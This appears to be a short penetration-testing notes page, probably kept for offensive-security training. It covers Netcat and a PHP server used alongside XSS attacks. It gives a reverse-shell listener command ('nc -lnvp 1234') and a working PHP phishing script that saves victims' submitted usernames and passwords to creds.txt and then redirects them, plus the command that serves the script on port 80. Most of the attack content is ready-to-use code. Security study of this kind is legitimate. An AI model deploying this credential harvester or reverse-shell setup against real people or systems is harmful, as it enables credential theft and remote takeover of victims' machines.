# Netcat
Tool for TCP and UDP connections and listens. To kill interfering process, check [[Process Control]]

---
## Basic Commands
Setup reverse shell listener on attacker
```bash
nc -lnvp 1234
```

### Options

| <div style="width:140px">**Flag**</div> | **Description**        |
| --------------------------------------- | ---------------------- |
| `-n`                                    | Disable DNS resolution |

---

# PHP Server for [[XSS]]
Instead of a basic Netcat server, we may want to run a listener for a PHP server to add functionality.

First, add some code to `index.php` to create the phish:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Then listen on the same directory:
```bash
php -S 0.0.0.0:80
```

